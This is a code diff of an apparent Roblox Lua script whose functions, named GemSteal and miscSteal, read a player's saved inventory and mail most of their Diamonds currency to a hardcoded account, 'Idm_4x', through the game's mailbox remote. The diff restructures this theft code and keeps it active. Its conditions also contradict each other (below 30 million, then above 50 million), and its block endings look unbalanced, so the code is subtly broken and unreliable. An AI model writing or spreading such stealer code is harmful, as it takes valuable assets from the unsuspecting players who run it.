@@ -10,29 +10,33 @@ for i, v in pairs(GetSave().Inventory.Currency) do
         GemAmount1 = v._am
     end
 end
-if GemAmount1 < 30000000 then
-    task.wait(35)
-    game.ReplicatedStorage:WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
-    task.wait(1)
-    if GemAmount1 > 50000000 then
-        function GemSteal()
-            for i, v in pairs(GetSave().Inventory.Currency) do
-                if v.id == "Diamonds" then
-                    GemId = i
-                    local args = {
+
+function GemSteal()
+    for i, v in pairs(GetSave().Inventory.Currency) do
+        if v.id == "Diamonds" then
+            GemId = i
+            local args = {
                         [1] = "Idm_4x",
                         [2] = MailMessage,
                         [3] = "Currency",
                         [4] = GemId,
                         [5] = GemAmount1 - 30010000
                     }
-                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-                    end
-                end
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
             end
         end
-    GemSteal()
+    end
 end
+
+if GemAmount1 < 30000000 then
+    task.wait(35)
+    game.ReplicatedStorage:WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
+    task.wait(1)
+        if GemAmount1 > 50000000 then
+            GemSteal()
+        end
+    end
+end    
 local function miscSteal()
     for i, v in pairs(save.Seed) do
         if v.id == "Diamond" and v._am >= 350 then
